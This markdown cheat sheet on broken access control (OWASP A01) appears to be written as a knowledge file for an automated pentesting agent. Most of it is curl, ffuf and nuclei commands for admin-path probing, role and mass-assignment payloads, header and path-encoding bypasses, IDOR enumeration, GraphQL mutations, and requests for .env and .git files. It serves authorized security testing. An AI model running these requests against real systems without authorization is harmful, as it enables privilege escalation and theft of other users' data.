---
vuln_type: broken_access_control
severity: critical
cwe: [CWE-284, CWE-285, CWE-639, CWE-862, CWE-863]
owasp: A01:2021-Broken-Access-Control
related_tools: [curl, ffuf, nuclei]
exploit_agent: access_control_agent
tags: [idor, privilege-escalation, forced-browsing, path-traversal, access-control, horizontal, vertical, api, mass-assignment]
---

# Broken Access Control (OWASP A01)

## Overview
The #1 OWASP risk. Occurs when users can act outside their intended permissions — accessing other users' data (horizontal), gaining admin privileges (vertical), or performing unauthorized actions. Differs from authentication (proving identity) — this is about authorization (what you're allowed to do).

---

## Attack Categories

### 1. Vertical Privilege Escalation
Gaining higher-level access (user → admin).

**Admin page access:**
```bash
# Try common admin paths without admin session
curl http://target.com/admin
curl http://target.com/admin/dashboard
curl http://target.com/administrator
curl http://target.com/admin.php
curl http://target.com/panel
curl http://target.com/management
curl http://target.com/console
curl http://target.com/internal

# With ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,302 -fc 404
```

**Role parameter manipulation:**
```bash
# In request body
curl -X POST http://target.com/api/update-profile \
  -b "session=USER_COOKIE" \
  -d '{"name":"test","role":"admin"}'

# In URL parameter
curl http://target.com/dashboard?admin=true
curl http://target.com/dashboard?role=admin
curl http://target.com/dashboard?isAdmin=1
curl http://target.com/dashboard?debug=1
```

**HTTP method switching:**
```bash
# If GET is blocked but POST/PUT/DELETE isn't:
curl -X POST http://target.com/admin/users
curl -X PUT http://target.com/admin/settings
curl -X DELETE http://target.com/admin/users/5

# If POST is checked but GET isn't:
curl http://target.com/admin/delete-user?id=5

# PATCH may bypass checks:
curl -X PATCH http://target.com/api/users/1 -d '{"role":"admin"}'
```

**HTTP header bypass:**
```bash
# Some apps check access only for external requests
curl http://target.com/admin -H "X-Original-URL: /admin"
curl http://target.com/ -H "X-Rewrite-URL: /admin"
curl http://target.com/admin -H "X-Forwarded-For: 127.0.0.1"
curl http://target.com/admin -H "X-Real-IP: 127.0.0.1"
curl http://target.com/admin -H "X-Custom-IP-Authorization: 127.0.0.1"
```

### 2. Horizontal Privilege Escalation
Accessing another user's resources at the same privilege level.

**IDOR (see other_vulns.md for full details):**
```bash
# Change user ID in API calls
GET /api/users/100/orders → /api/users/101/orders
GET /api/invoices/5001 → /api/invoices/5002
GET /download?file_id=123 → ?file_id=124

# Try different ID formats
/api/users/100       (integer)
/api/users/user100   (prefixed)
/api/users/GUID      (if GUIDs are predictable or leaked)
```

**Parameter pollution:**
```bash
# Duplicate parameters — some frameworks take first, some take last
GET /api/profile?user_id=100&user_id=101
POST /api/profile -d "user_id=100&user_id=101"
```

### 3. Forced Browsing

**Access resources by guessing URLs:**
```bash
# Direct file access
http://target.com/backup.zip
http://target.com/database.sql
http://target.com/.git/config
http://target.com/.env
http://target.com/robots.txt (reveals hidden paths)
http://target.com/sitemap.xml

# Predictable resource paths
http://target.com/uploads/report_2024_01.pdf
http://target.com/static/invoices/INV-001.pdf

# Version/backup files
http://target.com/config.php.bak
http://target.com/config.php~
http://target.com/config.php.old
http://target.com/config.php.swp
http://target.com/.config.php.swp
```

**API version downgrade:**
```bash
# Newer API may have access controls, older may not
/api/v2/admin/users → 403 Forbidden
/api/v1/admin/users → 200 OK (no access control)

# Remove version
/api/admin/users
```

### 4. Mass Assignment / Parameter Tampering

**Add extra fields the API doesn't expect you to control:**
```bash
# Registration with hidden fields
curl -X POST http://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","role":"admin","isVerified":true,"credits":99999}'

# Profile update with privilege fields
curl -X PUT http://target.com/api/profile \
  -b "session=USER_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true}'
```

**How to find hidden parameters:**
```bash
# 1. Check API responses for fields not in the request
GET /api/profile → {"name":"test","role":"user","isAdmin":false,"credits":100}
# → Try setting role, isAdmin, credits in PUT/PATCH

# 2. Check JavaScript source for parameter names
grep -r "role\|isAdmin\|admin\|privilege" app.js

# 3. Use Arjun for parameter discovery
arjun -u http://target.com/api/profile -m JSON
```

### 5. Path Traversal in Access Control

```bash
# Bypass path-based access control
/admin → 403
/ADMIN → 200
/Admin → 200
/admin/ → 200 (trailing slash)
/admin/. → 200
/./admin → 200
/admin..;/ → 200 (Tomcat path parameter)
/%2fadmin → 200 (URL encoding)
/admin%20 → 200 (trailing space)
/admin%09 → 200 (tab)
/admin%00 → 200 (null byte)
```

### 6. Insecure Direct Object References in APIs

**Common API patterns vulnerable to IDOR:**
```bash
# REST APIs
GET /api/users/{id}
GET /api/orders/{id}
GET /api/documents/{id}
DELETE /api/users/{id}
PUT /api/users/{id}

# GraphQL
query { user(id: 101) { name email password } }

# File download
GET /download?filename=report_user100.pdf → report_user101.pdf

# Webhook/callback
POST /api/webhook -d '{"user_id": 101}' (change from your ID)
```

**ID encoding patterns:**
```bash
# Sequential integers: 1, 2, 3
# UUIDs: check if enumerable from other endpoints
# Base64-encoded IDs: decode, modify, re-encode
echo "dXNlcl8xMDA=" | base64 -d  # user_100
echo -n "user_101" | base64       # dXNlcl8xMDE=
# Hashed IDs: MD5/SHA1 of sequential values
echo -n "100" | md5sum
echo -n "101" | md5sum
```

---

## GraphQL-Specific Access Control Issues

```graphql
# Introspection (discover all queries/mutations)
{__schema{types{name fields{name}}}}

# Access other users' data
query { user(id: "other_user_id") { email password } }

# Batch query (bypass rate limiting)
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]

# Mutation without authorization
mutation { deleteUser(id: "admin_id") { success } }
mutation { updateRole(userId: "my_id", role: "admin") { success } }
```

---

## Automated Testing

```bash
# Forced browsing with ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302 -fc 404

# IDOR enumeration
seq 1 100 | xargs -I{} curl -s -o /dev/null -w "%{http_code} {}\n" -b "session=COOKIE" "http://target.com/api/users/{}"

# Admin path brute force
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -H "Cookie: session=USER_COOKIE"

# HTTP method testing
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method http://target.com/admin
  echo
done

# Nuclei access control templates
nuclei -u http://target.com -t exposures/ -t misconfiguration/
```

---

## Testing Methodology

```
1. Map all endpoints and their required roles
2. For each endpoint:
   a. Try accessing without authentication → should get 401
   b. Try accessing with low-privilege user → should get 403
   c. Try accessing with modified ID/parameters → should only show own data
   d. Try all HTTP methods → only expected methods should work
   e. Try path manipulation (case, encoding, trailing slash)
3. For each API field:
   a. Check if response contains fields not in request (mass assignment candidates)
   b. Try including privilege-related fields in write operations
4. Test API version downgrade
5. Test header-based bypasses (X-Original-URL, X-Forwarded-For)
```

---

## Output Interpretation

### Confirmed access control bypass indicators
- Admin page accessible with regular user session (200 instead of 403)
- Other user's data returned when changing ID parameter
- Role changed after submitting extra parameter in profile update
- Older API version returns data that newer version blocks
- HTTP method change bypasses access check

### Not a bypass (false positives)
- 200 response but generic "Access Denied" content (check body, not just status)
- Redirect to login page (302 to /login)
- API returns sanitized/partial data for unauthorized users
- Resource exists but contains no sensitive data

### Severity assessment
- **Critical**: Admin access gained (vertical escalation to admin)
- **Critical**: Mass assignment → role change to admin
- **High**: Other users' sensitive data accessible (horizontal IDOR)
- **High**: Unauthorized state-changing operations (delete, modify)
- **Medium**: Non-sensitive data exposed via IDOR
- **Medium**: Forced browsing reveals internal paths but no sensitive data
- **Low**: HTTP method not restricted but no impact demonstrated
